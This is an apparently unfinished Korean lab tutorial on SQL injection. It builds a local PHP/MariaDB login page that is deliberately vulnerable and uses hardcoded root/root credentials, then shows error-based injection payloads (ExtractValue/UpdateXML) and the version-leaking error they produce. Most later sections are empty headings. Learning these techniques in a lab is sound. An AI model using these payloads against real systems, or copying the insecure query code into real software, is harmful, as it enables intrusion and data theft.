# Union based SQL Injection

aa

# **INDEX**

**1. [환경 구성](#환경-구성)**

**2. [a](#a)**

 - [DBMS 버전 확인](#DBMS-버전-확인)

 - [DBMS 계정 확인](#DBMS-계정-확인)

 - [데이터베이스 이름 확인](#데이터베이스-이름-확인)

 - [테이블 이름 확인](#테이블-이름-확인)

 - [컬럼 이름 확인](#컬럼-이름-확인)

 - [데이터 확인](#데이터-확인)


# **환경 구성**

| Type          | Version                   |
| :---          | :---                      |
| OS            | Ubuntu 20.04.3 LTS        |
| Architecture  | x86-64                    |
| IP            | 192.168.0.58              |
| apache2       | 2.4.41-4ubuntu3.10        |
| php           | 7.4.3                     |
| mariadb       | 10.3.34-0ubuntu0.20.04.1  |

apache, php와 데이터베이스를 사용하기 위해 관련 패키지를 설치하자.

```sh
root@ubuntu:~# apt -y install apache2 php mariadb-server php-mysql
```

root비밀번호를 설정하고 데이터베이스, 테이블을 생성한 뒤 데이터를 넣자.

```sh
root@ubuntu:~# mysql_secure_installation
Enter current password for root (enter for none):
Set root password? [Y/n] Y
New password:
Re-enter new password:
Remove anonymous users? [Y/n] Y
Disallow root login remotely? [Y/n] n
Remove test database and access to it? [Y/n] Y
Reload privilege tables now? [Y/n] Y
root@ubuntu:~# mysql -u root -p'root'
MariaDB [(none)]> create database test;
MariaDB [(none)]> use test;
MariaDB [test]> create table user (id varchar(30), pw varchar(30));
MariaDB [test]> insert into user(id,pw) values('admin','helloworld');
```

생성한 데이터베이스로 접근할 수 있는 권한을 부여하자.

```sh
MariaDB [(none)]> grant all privileges on test.* to 'root'@localhost identified by 'root';
MariaDB [(none)]> flush privileges;
```

이후 php.ini를 수정하여 데이터베이스 관련 함수를 사용할 수 있도록 하자.

```ini
extension=mysqli.so
```

SQLi(SQL Injection)에 취약한 페이지를 생성하자.

```php
<?php
	if (isset($_GET['userid']) && isset($_GET['password'])) {
		$conn = mysqli_connect("localhost", "root", "root", "test");
		if (!$conn) die("mysql connect error : ".mysqli_connect_error($conn));
		$sql = "SELECT id, pw FROM user WHERE id='".$_GET['userid']."' and pw='".$_GET['password']."'";
		$result = mysqli_query($conn, $sql);
		if (!result) echo "mysql query error : ".mysqli_error($conn);
		else {
			$row = mysqli_fetch_array($result);
			if ($row) echo "Welcome ".$row[id];
			else echo "Login Failed : ".mysqli_error($conn);
			mysqli_close($conn);
		}
	} else {
?>
<html>
	<body>
		<form action="/index.php" method="get">
			<label>ID : </label><input type="text" name="userid" required>
			<label>PW : </label><input type="password" name="password" required>
			<input type="submit" value="login">
		</form>
	</body>
</html>
<?php
	}
?>
```

# **a**

aa

## **DBMS 버전 확인**

에러 메세지에 DBMS의 버전을 출력하도록 유도해보자.

| data	| value	|
| :---	| :--- 	|
| ID	| ' AND ExtractValue(0,CONCAT(0x3a,VERSION()))#<br>' AND UpdateXML(0,CONCAT(0x3a,VERSION()),0)# |
| PW	| 아무 값(123) |
| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2CVERSION%28%29%29%29%23&password=123<br>http://192.168.0.58/index.php?userid=%27+AND+UpdateXML%280%2CCONCAT%280x3a%2CVERSION%28%29%29%2C0%29%23&password=123 |

결과는 다음과 같다.

	Login Failed : XPATH syntax error: ':10.3.34-MariaDB-0ubuntu0.20....'

## **DBMS 계정 확인**
## **데이터베이스 이름 확인**
## **테이블 이름 확인**
## **컬럼 이름 확인**
## **데이터 확인**

https://velog.io/@yu-jin-song/DB-SQL-%EC%9D%B8%EC%A0%9D%EC%85%98SQL-Injection
https://m.blog.naver.com/lstarrlodyl/221837243294
https://choco4study.tistory.com/10
https://www.lanian.co.kr/entry/Error-Based-SQL-Injection
https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/